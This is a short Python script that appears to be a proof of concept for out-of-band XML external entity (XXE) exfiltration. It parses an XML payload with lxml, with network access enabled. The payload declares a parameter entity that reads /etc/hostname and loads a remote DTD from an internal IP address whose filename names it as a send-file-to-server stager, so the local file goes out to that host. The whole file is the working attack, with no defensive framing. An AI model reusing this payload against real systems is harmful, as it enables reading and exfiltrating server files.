#! python3
from lxml import etree  # pip3 install --user lxml

xml = """
<!DOCTYPE DATA
[<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % dtd SYSTEM "http://172.31.72.4:10080/send_file_to_server.dtd">
%dtd;
%stager;
]>
<test>&send;</test>
"""

parser = etree.XMLParser(no_network=False, remove_blank_text=True)
try:
    doc = etree.fromstring(xml, parser=parser)
except Exception as e:
    print(e)
